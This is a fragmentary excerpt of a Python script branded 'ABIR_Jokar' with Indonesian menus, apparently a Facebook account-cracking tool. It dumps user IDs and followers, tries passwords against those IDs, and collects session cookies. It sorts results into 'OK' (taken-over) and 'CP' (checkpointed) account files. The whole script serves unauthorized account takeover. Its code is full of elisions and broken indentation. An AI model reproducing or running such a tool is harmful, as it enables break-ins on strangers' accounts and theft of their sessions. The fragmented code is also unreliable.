...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mABIR_Jokar_xy')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Jokar-Abir37/Aproval.txt/blob/main/Aproval-txt').text
		ua=open('.bbnew.txt','w')
...
\t  / ____ \| |_) || |_| | \ \ 
\t /_/    \_\____/_____|_|  \_\
{m}•{k}•{h}•{sir} Author : ABIR_Jokar {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN BERJokar.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	print('>> 5. Jokar Crack  ')
	print('>> 0. Keluar       ')
	_____ABIR__Jokar_____ = input('\n>> Pilih : ')
	if _____ABIR__Jokar_____ in ['1']:
		dump_massal()
	elif _____ABIR__Jokar_____ in ['2']:
		dump_follower()
	elif _____ABIR__Jokar_____ in ['3']:
		grup()
	elif _____ABIR__Jokar_____ in ['4']:
		crack_file()
	elif _____ABIR__Jokar_____ in ['5']:
		result()
	elif _____ABIR__Jokar_____ in ['0']:
...
#-----------------[ Jokar-CRACK ]-----------------#
def result():
	print(f'>> 1. Jokar {h}OK{x} Anda ')
	print(f'>> 2. Jokar {k}CP{x} Anda ')
	print('>> 3. Kembali	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Jokar CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/ABIR-DUMP')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/ABIR-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/ABIR-DUMP/'+geh,'r').read().splitlines()
		except:
...
def passwrd():
	...
	print('')
	print(f'>> Jokar {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'>> Jokar {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='ABIR-AJ CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='ABIR-AJ OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]ABIR-AJ OK[/bold green]'))
					ok+=1
					break
